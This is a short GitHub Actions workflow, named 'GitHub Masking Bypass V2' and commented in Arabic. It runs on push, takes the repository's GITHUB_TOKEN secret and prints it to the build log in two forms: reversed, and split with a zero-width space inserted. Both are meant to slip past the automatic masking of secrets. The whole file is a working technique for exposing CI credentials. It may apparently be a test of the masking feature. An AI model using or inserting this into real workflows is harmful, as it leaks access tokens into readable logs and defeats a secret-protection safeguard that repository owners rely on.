name: GitHub Masking Bypass V2
on: [push]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Bypass Masking with Shell Manipulation
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          # 1. تخزين التوكن في متغير محلي
          TOKEN="$GITHUB_TOKEN"
          
          # 2. محاولة طباعته بشكل مقلوب (Reverse)
          REVERSED=$(echo "$TOKEN" | rev)
          
          # 3. محاولة طباعته مع إدراج حرف خفي (Zero-Width Space)
          # سنستخدم printf لإدراج الحرف بشكل صحيح في الباش
          ZWSP=$(printf '\u200B')
          HALF=$((${#TOKEN} / 2))
          PART1=${TOKEN:0:HALF}
          PART2=${TOKEN:HALF}
          
          echo "--- Testing Reverse ---"
          echo "Reversed Token: $REVERSED"
          
          echo "--- Testing Zero-Width Space ---"
          echo "Split Token: ${PART1}${ZWSP}${PART2}"
